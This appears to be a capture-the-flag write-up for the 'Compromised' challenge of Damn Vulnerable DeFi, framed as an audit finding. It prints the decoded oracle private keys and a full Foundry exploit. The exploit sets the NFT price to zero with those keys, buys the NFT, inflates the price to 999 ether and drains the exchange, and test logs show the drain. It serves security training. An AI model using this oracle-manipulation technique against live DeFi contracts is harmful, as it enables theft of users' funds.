# Damn Vulnerable Defi - Compromised
- Scope
    - Exchange.sol
    - DamnValuableNFT.sol
    - TrustfulOracle.sol  
    - TrustfulOracleInitializer.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)
    - [ETH Address Tool](https://www.rfctools.com/ethereum-address-test-tool/)

# Findings

## Leaked private key gives attackers control of oracle and price of the token or NFT is manipulated

### Summary
Leaked private key gives attackers control of oracle and price of the token or NFT is manipulated to drain the ETH off exchange.

### Vulnerability Details
Leaked private keys are dangerous as it gives attackers total control of the oracle and the token or NFT price can be manipulated.

### Impact/Proof of Concept
Remember to inherit `IERC721Receiver` on the CompromisedChallenge contract.
```
function test_compromised() public checkSolved {
        // From the readme.md file, we have 2 leaked data and we need to convert them from Hexadecimal -> ASCII -> DecodeBase64 -> String
        // Leaked_1 = 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
        // Leaked_2 = 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
        // pk_1 = "7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744"
        // pk_2 = "68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159"
        // After conversion, we can see that they are actually the private key of the 2 sources as their addr is calculated to be the same.
        // Try it at -> https://www.rfctools.com/ethereum-address-test-tool/
        address source1 = 0x188Ea627E3531Db590e6f1D71ED83628d1933088;
        address source2 = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8;
        
        // Simulate hijacking source 1 and 2 as we have the private keys, then set the NFT price to 0
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        console.log("DNFT Price: ", oracle.getMedianPrice("DVNFT") / 1e18);

        // Switch to player and buy with 1 ether, as 0 will revert
        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1}();

        // Switch back to source 1 and 2 and set the NFT price to be very high
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 999 ether);
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 999 ether);
        console.log("DNFT Price: ", oracle.getMedianPrice("DVNFT") / 1e18);

        // Approve the sale and then sell DNFT back to exchange for a high price
        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);

        // Transfer ETH to recovery
        (bool success,) = recovery.call{value: 999 ether}("");
        require(success);
        console.log("Player Balance: ", player.balance / 1e18);
        console.log("Recovery Balance: ", recovery.balance / 1e18);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
```

Results
```diff
Ran 2 tests for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_assertInitialState() (gas: 40733)
[PASS] test_compromised() (gas: 246870)
Logs:
  DNFT Price:  0
  DNFT Price:  999
  Player Balance:  0
  Recovery Balance:  999

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.96ms (604.80µs CPU time)
```

